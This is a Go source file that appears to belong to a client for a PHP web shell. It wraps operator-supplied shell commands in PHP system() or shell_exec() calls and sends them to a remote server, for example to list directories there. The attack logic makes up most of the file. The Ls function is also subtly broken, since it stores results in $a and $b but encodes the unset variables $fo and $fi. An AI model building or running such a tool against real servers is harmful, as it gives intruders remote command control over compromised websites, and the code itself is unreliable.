package command

import (
	"fmt"
	"network"

	"github.com/urfave/cli"
)

type CMD struct {
	_method  int
	_context string
}

func handleNotConnected() {
	fmt.Println("You haven't setup the required information, please refer to srv config")
}

func (c *CMD) getSystemCMD(cmd, r string) string {
	return "ob_start();system('" + cmd + "');$" + r + "=ob_get_contents();ob_end_clean();"
}

func (c *CMD) getShellExecCMD(cmd, r string) string {
	return "$" + r + "=shell_exec('" + cmd + "');"
}

func (c *CMD) createCMD(cmd *string, r string) {
	var contexter string

	if c._context != "" {
		contexter = "cd " + c._context + " && "
	}

	shellCMD := contexter + *cmd

	if c._method == 0 {
		shellCMD = c.getSystemCMD(shellCMD, r)
	} else if c._method == 1 {
		shellCMD = c.getShellExecCMD(shellCMD, r)
	}

	*cmd = shellCMD
}

func (cmd *CMD) Ls(c *cli.Context) {
	if !network.NET.IsSetup() {
		handleNotConnected()
		return
	}

	var context string

	if len(c.Args()) > 0 {
		context = "cd " + c.Args().Get(0) + " && "
	}

	lsFolder := context + "ls -ld */"
	lsFile := context + "ls -lp | grep -v /"

	cmd.createCMD(&lsFolder, "a")
	cmd.createCMD(&lsFile, "b")

	ls := lsFolder + lsFile + "$r=json_encode(array(urlencode($fo), urlencode($fi)));"

	//fmt.Println(ls)

	network.NET.Send(ls)
}
